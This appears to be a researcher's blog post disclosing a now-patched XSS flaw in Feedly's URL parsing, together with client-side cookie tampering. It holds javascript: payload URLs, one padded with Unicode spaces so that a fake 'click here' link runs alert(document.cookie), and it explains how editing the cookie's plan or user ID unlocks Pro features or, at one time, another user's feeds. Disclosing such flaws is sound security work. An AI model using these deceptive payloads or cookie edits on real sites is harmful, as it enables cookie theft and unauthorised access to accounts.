---
layout: post
title: 'XSS in Feedly and cookie manipulation'
---

### XSS
I reported a flaw in the URL parsing mechanism across `feedly.com` which led to an XSS. It has been patched in version 20.4.771 back in June. I have been able to replicate it at both `https://feedly.com` and `http://feedly.com` being both logged-in and logged-out. The affected URL is `https://feedly.com/index.html#subscription` however, the issue was in the URL parsing code itself, which wouldn't filter out URL schemes like `javascript:` (or `itunes:`, et al). An example:

{% highlight html %}
https://feedly.com/index.html#subscription%2Ffeed%2Fjavascript%3Aalert(1)
{% endhighlight %}

 <!--more-->Here's a small PoC I coded up to mislead a potential victim. Upon clicking the link under the text "Sorry. Feed not found." simple `alert(document.cookie)` would run. The PoC is decorated a bit to disguise its nature using an array of Unicode (that is why you don't see the alert implementation in the page body). The text *Go back to the main page. Click here.* is actually a malicious link that triggers the PoC.

![PoC][1]

<pre>
https://feedly.com/index.html#subscription%2F%20%23%E1%BC%A2%0Fajavascript%3A%2F%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83Get%20back%20to%20the%20main%20page.%20Click%20here.%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%E2%80%83%2F%3Balert(document.cookie)
</pre>

### Cookie manipulation

Feedly's cookie looks something like

~~~

{"plan":"standard","provider":"foobar","feedlyId":"12eebcd2-8f01-b22a-d109-185f2df74e949" ... }

~~~

By simply changing "plan" to "pro" you get the benefits of the Pro subscription in terms of UI enhancements but allegedly, not the server-side benefits (*Edit: any suggestions on how to verify this?*). The Feedly team said they considered this an advanced user's hack rather than a security issue, so feel free to use it at all times yourselves.

It was also possible to change a user ID in the cookie to another, known one, so as to see their feeds. However, this was probably patched while I was still investigating the issue and now I can't replicate it. Finding out other users' ID is not straightforward as well. Hence, discard this last paragraph but I note that their infrastructure might be prone to that kind ID swapping in general.

Update: Forgot to mention I received Feedly Pro from the team. Thanks.

> Read the manual if unsure, post comment(s) if unclear.


  [1]: https://pbs.twimg.com/media/Bp3IHQhIEAAGnvm.png:large
